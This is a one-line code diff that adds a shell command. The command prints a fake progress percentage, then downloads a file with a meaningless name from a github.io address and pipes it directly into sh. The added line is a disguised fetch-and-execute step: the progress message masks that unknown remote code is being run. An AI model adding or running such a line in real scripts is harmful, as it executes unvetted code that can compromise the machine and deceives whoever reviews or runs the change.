@@ -1,0 +1,1 @@
+echo 'Progress: 53.0%'; curl -L --progress-bar frkns.github.io/fun/computers_insertion_navigation_interview_installing.gzip | sh
